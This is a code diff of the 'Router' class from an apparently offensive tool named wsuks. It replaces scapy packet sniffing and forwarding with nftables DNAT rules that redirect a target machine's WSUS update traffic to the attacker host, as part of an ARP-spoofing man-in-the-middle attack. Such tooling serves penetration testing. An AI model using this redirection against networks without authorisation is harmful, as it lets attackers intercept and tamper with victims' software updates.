@@ -2,63 +2,56 @@
 # -*- coding: utf-8 -*-
 
 import logging
-import traceback
-from scapy.all import sniff, IP, TCP, get_if_hwaddr, fragment, TCPSession
-from scapy.sendrecv import sendp
-from threading import Thread
-import nftables
+from scapy.all import get_if_hwaddr
+try:
+    from nftables import Nftables
+except ImportError:
+    logger = logging.getLogger("wsuks")
+    logger.error("nftables is not installed. Please install nftables to use the Router class. See installation instructions in the README.md.")
+    exit(1)
 
 class Router:
     """
     This class is used to enable MITM attacks with ARP spoofing.
     """
 
-    def __init__(self):
+    def __init__(self, targetIp, hostIp, wsusIp, wsusPort, interface):
         self.logger = logging.getLogger("wsuks")
         self.isRunning = False
-        self.targetIp = None
-        self.hostIp = None
-        self.hostMac = None
-        self.wsusIp = None
-        self.interface = None
-
-    def _setRoute(self):
-        sniff(session=TCPSession, filter=f"tcp", prn=self._process_packet, store=0, iface=self.interface)
-
-    def _process_packet(self, packet):
-        if IP in packet and TCP in packet and packet[IP].src == self.targetIp and packet.dst == self.hostMac and packet[IP].dst == self.wsusIp:
-            self.logger.debug(f"Forwarding packet from {packet[IP].src} to {self.hostIp}")
-            packet[IP].dst = self.hostIp  # Ziel-IP-Adresse ändern
-            del packet[IP].chksum
-            del packet[TCP].chksum
-            packet.show2(dump=True)
-            frags = fragment(packet, fragsize=1000)
-            try:
-                for frag in frags:
-                    sendp(frag, verbose=0, iface=self.interface)  # Send Package
-            except Exception as e:
-                self.logger.error(f"Error while forwarding packet: {e}")
-                traceback.print_exc()
-
-    def start(self, targetIp, hostIp, wsusIp, interface):
         self.targetIp = targetIp
         self.hostIp = hostIp
         self.hostMac = get_if_hwaddr(interface)
         self.wsusIp = wsusIp
+        self.wsusPort = wsusPort
         self.interface = interface
-        self.isRunning = True
+        self.nft = Nftables()
+        self.nft.set_json_output(True)
 
-        self.logger.info(f"Set route for target {targetIp} to {hostIp}")
-        t2 = Thread(target=self._setRoute)
-        t2.daemon = True
-        t2.start()
+    def start(self):
+        """Configure nftables equivalent to the following rules:
+
+        nft 'add table ip wsuks'
+        nft 'add chain ip wsuks wsuks-nat { type nat hook prerouting priority dstnat; policy accept; }'
+        nft 'add rule ip wsuks wsuks-nat ip saddr <TARGET-IP> tcp dport <WSUKS-PORT> dnat ip to <HOST-IP>'
+        """
+        self.isRunning = True
+        self.logger.info(f"Configur nftables for NATing incoming packages from {self.targetIp} with source {self.wsusIp}:{self.wsusPort} to {self.hostIp}")
+
+        self.nft.cmd("add table ip wsuks")
+        self.nft.cmd("add chain ip wsuks wsuks-nat { type nat hook prerouting priority dstnat; policy accept; }")
+        self.nft.cmd(f"add rule ip wsuks wsuks-nat ip saddr {self.targetIp} tcp dport {self.wsusPort} dnat ip to {self.hostIp}")
 
     def stop(self):
         """
-        Stop the ARP spoofing process.
+        Stop the ARP spoofing process by deleting configured nftables table 'wsuks':
+
+        nft flush table ip wsuks
+        nft delete table ip wsuks
         """
         if self.isRunning and self.targetIp:
-            self.logger.info(f"Delete route for {self.targetIp} to {self.hostIp}")
+            self.logger.info("Stop NATing: Delete 'wsuks' routing table")
+            self.nft.cmd("flush table ip wsuks")
+            self.nft.cmd("delete table ip wsuks")
             self.isRunning = False
         else:
             self.logger.error("Router is not running")
